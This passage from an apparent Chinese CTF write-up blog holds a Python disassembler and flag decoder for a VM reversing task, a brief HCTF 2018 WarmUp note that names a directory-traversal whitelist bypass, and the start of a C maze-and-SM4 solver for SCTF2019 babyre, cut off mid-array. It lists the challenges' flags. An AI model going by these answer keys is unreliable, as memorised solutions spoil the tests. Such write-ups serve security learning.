v0=[eip+1],push v0</span></span><br><span class="line"><span class="string">3 push reg[v0]</span></span><br><span class="line"><span class="string">4 pop reg[v0]</span></span><br><span class="line"><span class="string">5 output</span></span><br><span class="line"><span class="string">6 reg[v0]+=reg[v1]</span></span><br><span class="line"><span class="string">7 reg[v0]-=reg[v1]</span></span><br><span class="line"><span class="string">8 reg[v0]*=reg[v1]</span></span><br><span class="line"><span class="string">9 两个寄存器分别保存reg[v0]/reg[v1]的除数和余数</span></span><br><span class="line"><span class="string">10 reg[v0]^=reg[v1]</span></span><br><span class="line"><span class="string">11 eip=3*v0-3</span></span><br><span class="line"><span class="string">12 reg[v0]-reg[v1]并将结果保存在标志寄存器</span></span><br><span class="line"><span class="string">13 lags=0: eip=3*v0-3，否则eip+=3</span></span><br><span class="line"><span class="string">14 flags=1: eip=3*v0-3，否则eip+=3</span></span><br><span class="line"><span class="string">15 flags&gt;0: eip=3*v0-3，否则eip+=3</span></span><br><span class="line"><span class="string">16 flags&lt;0: </span></span><br><span class="line"><span class="string">17 输入,DA5BA8存储字符串,DA5BDC存储长度</span></span><br><span class="line"><span class="string">18 某加密函数</span></span><br><span class="line"><span class="string">19 reg[v0]=stack[DA5BD0+reg[v1]]</span></span><br><span class="line"><span class="string">20 reg[v0]=DA5BA8[reg[v1]]</span></span><br><span class="line"><span class="string">FF exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">eip = <span class="number">0</span></span><br><span class="line">esp = <span class="number">0</span></span><br><span class="line">flags=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> eip&lt;len(opc):</span><br><span class="line">    inst = opc[eip]</span><br><span class="line">    v0=opc[eip+<span class="number">1</span>]</span><br><span class="line">    v1=opc[eip+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> inst==<span class="number">0</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;nop&#x27;</span>)</span><br><span class="line">        eip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">1</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]=%d&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">2</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        esp+=<span class="number">1</span></span><br><span class="line">        print(<span class="string">&#x27;push %d;esp=%d&#x27;</span>%(v0,esp))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">3</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        esp+=<span class="number">1</span></span><br><span class="line">        print(<span class="string">&#x27;push reg[%d];esp=%d&#x27;</span>%(v0,esp))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">4</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        esp-=<span class="number">1</span></span><br><span class="line">        print(<span class="string">&#x27;pop reg[%d]; esp=%d&#x27;</span>%(v0,esp))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">5</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;output&#x27;</span>)</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">6</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]+=reg[%d]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">7</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]-=reg[%d]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">8</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]*=reg[%d]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">9</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]/reg[%d] ;--------&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">10</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]^=reg[%d]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">11</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;jmp %02X&#x27;</span>%(<span class="number">3</span>*v0<span class="number">-3</span>))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">12</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;cmp reg[%d],reg[%d]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">13</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;je %02X&#x27;</span>%(<span class="number">3</span>*v0<span class="number">-3</span>))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">14</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;jne %02X&#x27;</span>%(<span class="number">3</span>*v0<span class="number">-3</span>))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">15</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;jg %02X&#x27;</span>%(v0*<span class="number">3</span><span class="number">-3</span>))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">16</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;jl %02X&#x27;</span>%(v0*<span class="number">3</span><span class="number">-3</span>))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">17</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">18</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">19</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]=stack[DA5BD0+reg[%d]]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">20</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]=DA5BA8[reg[%d]]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">0xFF</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">        <span class="comment"># break</span></span><br><span class="line"></span><br><span class="line">a = [<span class="number">7</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">oth = [ord(<span class="string">&#x27;&#123;&#x27;</span>),ord(<span class="string">&#x27;&#125;&#x27;</span>),ord(<span class="string">&#x27;_&#x27;</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a),<span class="number">2</span>):</span><br><span class="line">    t = a[i]*<span class="number">16</span>+a[i+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> t <span class="keyword">in</span> oth:</span><br><span class="line">        flag+=chr(t)</span><br><span class="line">    <span class="keyword">elif</span> (t+<span class="number">1</span>)^<span class="number">75</span>&gt;=<span class="number">65</span> <span class="keyword">and</span> (t+<span class="number">1</span>)^<span class="number">75</span>&lt;=<span class="number">90</span>:</span><br><span class="line">        flag+=chr((t+<span class="number">1</span>)^<span class="number">75</span>)</span><br><span class="line">    <span class="keyword">elif</span> (t+<span class="number">1</span>)^<span class="number">71</span>&gt;=<span class="number">97</span> <span class="keyword">and</span> (t+<span class="number">1</span>)^<span class="number">71</span>&lt;=<span class="number">122</span>:</span><br><span class="line">        flag+=chr((t<span class="number">-1</span>)^<span class="number">71</span>)</span><br><span class="line">print(flag[::<span class="number">-1</span>])</span><br></pre></td></tr></table></figure>

flag&#123;Such_A_EZVM&#125;

## [web][HCTF 2018]WarmUp

1. 打开注释，发现source.php
2. 发现hint.php
3. 要求在白名单内
4. 需要目录穿越
   flag&#123;5cae09d5-ee32-4ee4-806a-519032a92250&#125;

## [rev][SCTF2019]babyre

1. flag存在3段

2. 第一段是走一个三维迷宫，实在懒得走了，写了个脚本，深度优先搜索走迷宫，结果脚本找到了程序的另一条路= =

   明白了，这一问是基于三维迷宫做的，所以应该改进脚本基于三维迷宫

3. 第二段flag是base64解码，所以只需要把base64编码的那段东西放进去就行

4. 第三段是仿sm4加密

   这里太不认真了ROR6看成了ROL6

脚本

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">uint8_t</span>* data, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==============%s========&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(i % <span class="number">16</span>))<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n================================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">uint32_t</span> direc[] = &#123; <span class="number">-5</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">25</span>,<span class="number">-25</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> direcc[] = <span class="string">&quot;wsdaxy&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">uint32_t</span> pos = <span class="number">22</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* v;</span><br><span class="line"><span class="keyword">char</span> state[<span class="number">126</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pos &lt; <span class="number">0</span> || pos &gt;= <span class="built_in">strlen</span>(v))<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (state[pos] == <span class="string">&#x27;*&#x27;</span>)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (state[pos] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(state[pos]!=<span class="string">&#x27;.&#x27;</span>&amp;&amp;state[pos]!=<span class="string">&#x27;s&#x27;</span>)<span class="keyword">return</span>;</span><br><span class="line">    state[pos] = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        pos += direc[i];</span><br><span class="line">        flag[cnt++] = direcc[i];</span><br><span class="line">        search();</span><br><span class="line">        cnt--;</span><br><span class="line">        pos -= direc[i];</span><br><span class="line">    &#125;</span><br><span class="line">    state[pos] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">uint32_t</span> sbox[] = &#123; <span class="number">0xd6</span>, <span class="number">0x90</span>, <span class="number">0xe9</span>, <span class="number">0xfe</span>, <span class="number">0xcc</span>, <span class="number">0xe1</span>, <span class="number">0x3d</span>, <span class="number">0xb7</span>, <span class="number">0x16</span>, <span class="number">0xb6</span>, <span class="number">0x14</span>, <span class="number">0xc2</span>, <span class="number">0x28</span>, <span class="number">0xfb</span>, <span class="number">0x2c</span>, <span class="number">0x5</span>, <span class="number">0x2b</span>, <span class="number">0x67</span>, <span class="number">0x9a</span>, <span class="number">0x76</span>, <span class="number">0x2a</span>, <span class="number">0xbe</span>, <span class="number">0x4</span>, <span class="number">0xc3</span>, <span class="number">0xaa</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x6</span>, <span class="number">0x99</span>, <span class="number">0x9c</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xf4</span>, <span class="number">0x91</span>, <span class="number">0xef</span>, <span class="number">0x98</span>, <span class="number">0x7a</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0xb</span>, <span class="number">0x43</span>, <span class="number">0xed</span>, <span class="number">0xcf</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0xe4</span>, <span class="number">0xb3</span>, <span class="number">0x1c</span>, <span class="number">0xa9</span>, <span class="number">0xc9</span>, <span class="number">0x8</span>, <span class="number">0xe8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xdf</span>, <span class="number">0x94</span>, <span class="number">0xfa</span>, <span class="number">0x75</span>, <span class="number">0x8f</span>, <span class="number">0x3f</span>, <span class="number">0xa6</span>, <span class="number">0x47</span>, <span class="number">0x7</span>, <span class="number">0xa7</span>, <span class="number">0xfc</span>, <span class="number">0xf3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xba</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3c</span>, <span class="number">0x19</span>, <span class="number">0xe6</span>, <span class="number">0x85</span>, <span class="number">0x4f</span>, <span class="number">0xa8</span>, <span class="number">0x68</span>, <span class="number">0x6b</span>, <span class="number">0x81</span>, <span class="number">0xb2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xda</span>, <span class="number">0x8b</span>, <span class="number">0xf8</span>, <span class="number">0xeb</span>, <span class="number">0xf</span>, <span class="number">0x4b</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9d</span>, <span class="number">0x35</span>, <span class="number">0x1e</span>, <span class="number">0x24</span>, <span class="number">0xe</span>, <span class="number">0x5e</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xd1</span>, <span class="number">0xa2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7c</span>, <span class="number">0x3b</span>, <span class="number">0x1</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xd4</span>, <span class="number">0x0</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9f</span>, <span class="number">0xd3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4c</span>, <span class="number">0x36</span>, <span class="number">0x2</span>, <span class="number">0xe7</span>, <span class="number">0xa0</span>, <span class="number">0xc4</span>, <span class="number">0xc8</span>, <span class="number">0x9e</span>, <span class="number">0xea</span>, <span class="number">0xbf</span>, <span class="number">0x8a</span>, <span class="number">0xd2</span>, <span class="number">0x40</span>, <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0xb5</span>, <span class="number">0xa3</span>, <span class="number">0xf7</span>, <span class="number">0xf2</span>, <span class="number">0xce</span>, <span class="number">0xf9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xa1</span>, <span class="number">0xe0</span>, <span class="number">0xae</span>, <span class="number">0x5d</span>, <span class="number">0xa4</span>, <span class="number">0x9b</span>, <span class="number">0x34</span>, <span class="number">0x1a</span>, <span class="number">0x55</span>, <span class="number">0xad</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xf5</span>, <span class="number">0x8c</span>, <span class="number">0xb1</span>, <span class="number">0xe3</span>, <span class="number">0x1d</span>, <span class="number">0xf6</span>, <span class="number">0xe2</span>, <span class="number">0x2e</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xca</span>, <span class="number">0x60</span>, <span class="number">0xc0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xab</span>, <span class="number">0xd</span>, <span class="number">0x53</span>, <span class="number">0x4e</span>, <span class="number">0x6f</span>, <span class="number">0xd5</span>, <span class="number">0xdb</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xde</span>, <span class="number">0xfd</span>, <span class="number">0x8e</span>, <span class="number">0x2f</span>, <span class="number">0x3</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x72</span>, <span class="number">0x6d</span>, <span class="number">0x6c</span>, <span class="number">0x5b</span>, <span class="number">0x51</span>, <span class="number">0x8d</span>, <span class="number">0x1b</span>, <span class="number">0xaf</span>, <span class="number">0x92</span>, <span class="number">0xbb</span>, <span class="number">0xdd</span>, <span class="number">0xbc</span>, <span class="number">0x7f</span>, <span class="number">0x11</span>, <span class="number">0xd9</span>, <span class="number">0x5c</span>, <span class="number">0x41</span>, <span class="number">0x1f</span>, <span class="number">0x10</span>, <span class="number">0x5a</span>, <span class="number">0xd8</span>, <span class="number">0xa</span>, <span class="number">0xc1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xa5</span>, <span class="number">0xcd</span>, <span class="number">0x7b</span>, <span class="number">0xbd</span>, <span class="number">0x2d</span>, <span class="number">0x74</span>, <span class="number">0xd0</span>, <span class="number">0x12</span>, <span class="number">0xb8</span>, <span class="number">0xe5</span>, <span class="number">0xb4</span>, <span class="number">0xb0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4a</span>, <span class="number">0xc</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7e</span>, <span class="number">0x65</span>, <span class="number">0xb9</span>, <span class="number">0xf1</span>, <span class="number">0x9</span>, <span class="number">0xc5</span>, <span class="number">0x6e</span>, <span class="number">0xc6</span>, <span class="number">0x84</span>, <span class="number">0x18</span>, <span class="number">0xf0</span>, <span class="number">0x7d</span>, <span class="number">0xec</span>, <span class="number">0x3a</span>, <span class="number">0xdc</span>, <span class="number">0x4d</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xee</span>, <span class="number">0x5f</span>, <span class="number">0x3e</span>, <span class="number">0xd7</span>, <span class="number">0xcb</span>, <span class="number">0x39</span>, <span class="number">0x48</span>, <span class="number">0xc6</span>, <span class="number">0xba</span>, <span class="number">0xb1</span>, <span class="number">0xa3</span>, <span class="number">0x50</span>, <span class="number">0x33</span>, <span class="number">0xaa</span>, <span class="number">0x56</span>, <span class="number">0x97</span>, <span class="number">0x91</span>, <span class="number">0x7d</span>, <span class="number">0x67</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x70</span>, <span class="number">0xb2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROL32(x,i) ((x)<span class="meta-string">&lt;&lt;(i)|(((unsigned int)(x)&gt;&gt;(32-(i)))))</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tau(x) ((sbox[((x)&gt;&gt;16)&amp;0xFF]<span class="meta-string">&lt;&lt;16)|sbox[(x)&amp;0xFF]|(sbox[((x)&gt;&gt;8)&amp;0xFF]&lt;&lt;8)|(sbox[((x)&gt;&gt;24&amp;0xFF)]&lt;&lt;24))</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> L(x) ((ROL32((x),12))^(ROL32((x),8))^(ROL32((x),30))^(ROL32((x),26)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> v28[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    v28[<span class="number">0</span>] = <span class="number">3038287259199220266L</span>L;</span><br><span class="line">    v28[<span class="number">1</span>] = <span class="number">3039413159106062890L</span>L;</span><br><span class="line">    v28[<span class="number">2</span>] = <span class="number">3347065308717918762L</span>L;</span><br><span class="line">    v28[<span class="number">3</span>] = <span class="number">3038287259266591278L</span>L;</span><br><span class="line">    v28[<span class="number">4</span>] = <span class="number">3326517635351194154L</span>L;</span><br><span class="line">    v28[<span class="number">5</span>] = <span class="number">3038287259199220266L</span>L;</span><br><span class="line">    v28[<span class="number">6</span>] = <span class="number">3038287276446198314L</span>L;</span><br><span class="line">    v28[<span class="number">7</span>] = <span class="number">3036321349588626990L</span>L;</span><br><span class="line">    v28[<span class="number">8</span>] = <span class="number">3039417557152575022L</span>L;</span><br><span class="line">    v28[<span class="number">9</span>] = <span class="number">3038287259199482410L</span>L;</span><br><span class="line">    v28[<span class="number">10</span>] = <span class="number">3038287259199220266L</span>L;</span><br><span class="line">    v28[<span class="number">11</span>] = <span class="number">3326517635350932010L</span>L;</span><br><span class="line">    v28[<span class="number">12</span>] = <span class="number">3038287259266591274L</span>L;</span><br><span class="line">    v28[<span class="number">13</span>] = <span class="number">3326517652597910058L</span>L;</span><br><span class="line">    v28[<span class="number">14</span>] = <span class="number">3039413176353041966L</span>L;</span><br><span class="line">    v28[<span class="number">15</span>] = <span class="number">0x2A2E2A2A2E</span>LL;</span><br><span class="line">    v = (<span class="keyword">char</span>*)v28;</span><br><span class="line">    <span class="built_in">memcpy</span>(state, v, <span class="number">126</span>);</span><br><span class="line"></span><br><span class="line">    search();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;%s\n&quot;,v28);</span></span><br><span class="line">    <span class="keyword">uint64_t</span> f2 = <span class="number">3472619869582943091L</span>L; <span class="comment">// sctf_910 019_ftcs</span></span><br><span class="line">    <span class="keyword">uint32_t</span> a[] = &#123; <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span 